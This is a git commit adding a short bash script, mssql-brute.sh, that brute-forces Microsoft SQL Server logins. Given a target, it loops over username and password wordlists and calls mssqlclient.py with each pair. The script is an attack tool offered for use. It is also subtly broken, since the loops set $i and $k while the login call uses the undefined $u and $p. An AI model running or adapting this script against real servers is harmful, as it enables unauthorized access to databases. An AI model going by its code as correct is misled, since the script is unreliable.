61a0d6a30acce53b969a38b1f5ebe8f4f87c2c7b
Rafael Baldasso <77108325+rafaelbaldasso@users.noreply.github.com>
2023-05-19 14:30:41 -0300

    Create mssql-brute.sh

---
+++ mssql-brute.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+if [ "$1" == "" ]
+        then
+                echo;echo "[>] Usage: $0 <target>";echo
+        else
+                for i in $(cat usr.txt);do
+                        for k in $(cat pass.txt);do
+                                mssqlclient.py $u:$p@$1
+                        done
+                done
+fi
